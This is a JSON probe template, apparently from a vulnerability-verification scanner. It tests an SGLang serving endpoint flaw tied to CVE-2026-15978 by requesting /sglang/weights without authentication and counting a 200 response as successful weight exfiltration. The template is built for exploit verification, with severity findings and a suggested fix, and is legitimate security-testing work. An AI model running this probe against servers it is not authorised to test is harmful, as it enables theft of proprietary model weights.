{
  "schema": "inkblade-probe-template-v1",
  "key": "sglang-weight-exfil",
  "version": "1.0.0",
  "meta": {
    "name": {
      "zh": "SGLang weight exfiltration",
      "en": "SGLang weight exfiltration"
    },
    "series": "核心代码",
    "min_level": "利用验证",
    "writes": false,
    "requires": [],
    "surfaces": [],
    "cves": [
      "CVE-2026-15978"
    ],
    "fidelity": "reduced"
  },
  "inputs": {
    "target": {
      "from": "params.target",
      "required": true
    }
  },
  "defaults": {
    "timeout_ms": 5000,
    "tls_verify": false
  },
  "computed": {
    "success": "steps.weights.status == 200 or steps.weights.status == 201"
  },
  "steps": [
    {
      "id": "info",
      "op": "http",
      "method": "GET",
      "url": "{{input.target}}/sglang/server_info",
      "save": "info",
      "allow_failure": true
    },
    {
      "id": "weights",
      "op": "http",
      "method": "GET",
      "url": "{{input.target}}/sglang/weights",
      "save": "weights",
      "allow_failure": true
    },
    {
      "id": "cleanup",
      "op": "http",
      "method": "POST",
      "url": "{{input.target}}/__cleanup__",
      "body": {
        "marker": "{{ctx.marker}}"
      },
      "save": "cleanup",
      "allow_failure": true,
      "when": "params.cleanup != false"
    }
  ],
  "checks": [
    {
      "id": "target-answered",
      "when": "steps.weights.status != null",
      "message": "target did not answer"
    }
  ],
  "findings": [
    {
      "id": "cve",
      "when": "computed.success",
      "sev": "high",
      "title": "sglang-weight-exfil: CVE 利用验证",
      "detail": "spec=read-only step=weights",
      "cves": [
        "CVE-2026-15978"
      ],
      "evidence": "{{steps.weights.sha256}}",
      "mapping": "CVE arsenal / exploit-registry",
      "fix": "配置 API key；限制 /server_info 与权重端点",
      "version_matrix": {
        "product": "sglang",
        "source": "steps.weights.json.version",
        "vulnerable": [
          "*"
        ],
        "note": "CVE-linked version range; refine per advisory"
      }
    },
    {
      "id": "clean",
      "when": "not computed.success",
      "sev": "info",
      "title": "sglang-weight-exfil: 未观察到可利用响应（fixed/未部署）",
      "detail": "step=weights status={{steps.weights.status}}"
    }
  ],
  "artifacts": [
    {
      "name": "sglang-weight-exfil-trace.json",
      "kind": "json",
      "fields": {
        "module": "'sglang-weight-exfil'",
        "success": "computed.success",
        "cves": "[\"CVE-2026-15978\"]",
        "exploit_step": "'weights'",
        "status": "steps.weights.status"
      }
    }
  ],
  "payloads": {
    "benign": {
      "marker": "INKBLADE-BENIGN"
    },
    "attack": {
      "marker": "{{ctx.marker}}",
      "note": "lab replay only"
    }
  },
  "limits": {
    "timeout_ms": 60000,
    "max_http_requests": 32
  }
}
